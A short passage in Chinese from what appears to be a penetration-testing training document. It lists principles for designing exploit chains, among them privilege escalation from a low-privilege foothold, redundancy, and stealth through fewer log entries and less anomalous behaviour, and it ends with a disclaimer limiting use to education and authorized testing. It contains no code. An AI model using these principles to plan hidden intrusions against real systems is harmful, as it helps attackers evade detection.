### 8.3 漏洞利用链设计原则

| 原则 | 说明 |
|------|------|
| 最小权限利用 | 从最低权限漏洞入手，逐步提升 |
| 冗余设计 | 每个环节准备备选方案 |
| 隐蔽性 | 减少日志记录和异常行为 |
| 可靠性 | 确保利用链稳定可重复 |
| 影响评估 | 评估每个环节可能的副作用 |

---

> **免责声明**: 本文档仅用于网络安全教育和授权渗透测试培训。所有技术说明均基于防御角度的原理分析，不提供可直接使用的攻击工具或自动化利用脚本。未经授权对他人系统进行渗透测试属于违法行为。
